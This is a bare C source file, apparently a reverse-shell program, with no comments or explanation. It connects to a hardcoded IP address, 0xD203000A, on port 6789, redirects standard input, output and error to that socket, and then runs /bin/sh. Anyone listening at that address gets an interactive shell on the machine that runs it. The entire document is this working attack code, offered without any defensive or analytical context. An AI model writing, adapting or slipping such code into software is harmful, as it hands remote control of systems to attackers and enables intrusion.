#include <sys/socket.h>
#include <netinet/in.h>

int main() {
    char *shell[2];
    int soc, remote;
    struct sockaddr_in serv_addr;

    serv_addr.sin_family=2;
    serv_addr.sin_addr.s_addr=0xD203000A;
    serv_addr.sin_port = htons(6789);
    soc = socket(2,1,0);
    remote = connect(soc, (struct sockaddr*)&serv_addr, 0x10);
    dup2(soc, 0);
    dup2(soc, 1);
    dup2(soc, 2);
    shell[0] = "/bin/sh";
    shell[1] = 0;
    execve(shell[0], shell, 0);
}
